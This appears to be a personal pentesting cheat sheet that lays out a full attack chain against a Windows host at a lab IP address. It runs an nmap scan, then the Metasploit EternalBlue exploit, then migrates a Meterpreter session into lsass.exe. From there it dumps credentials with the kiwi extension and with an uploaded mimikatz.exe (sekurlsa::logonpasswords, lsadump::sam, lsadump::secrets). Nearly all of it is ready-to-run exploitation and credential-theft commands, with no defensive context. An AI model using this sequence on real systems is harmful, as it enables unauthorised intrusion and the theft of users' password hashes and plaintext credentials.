# Mimikatz 

"Kiwi - Extension for Meterpreter"
NTLM Hashes
Syskey finding

### Nmap Enum
```js
nmap 192.168.2.3 -sV
```

### Metasploit
```js
msf6> search eternalblue
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set RHOSTS 192.168.2.3
msf6> run   // if error check TARGET

"migrate lsass.exe"
meterpreter> sysinfo
meterpreter> getuid
meterpreter> pgrep lsass     (ps -S lsass.exe)
789
meterpreter> migrate 789
meterpreter> getuid 

"kiwi"
meterpreter> load kiwi
meterpreter> ?
meterpreter> creds_all
meterpreter> lsa_dump_sam      (Syskey)
meterpreter> lsa_dump_secrets
```

### Kiwi
```js
meterpreter> load kiwi
meterpreter> ?
meterpreter> creds_all
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
```

### Mimikatz
```js
meterpreter> pwd
meterpreter> cd C:\\
meterpreter> mkdir Temp
meterpreter> cd Temp
meterpreter> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
meterpreter> shell

C:> dir
C:> .\mimikatz.exe

mimikatz#> privilege::debug
mimikatz#> lsadump::sam
mimikatz#> lsadump::secrets
mimikatz#> sekurlsa::logonpasswords
mimikatz#> 
```
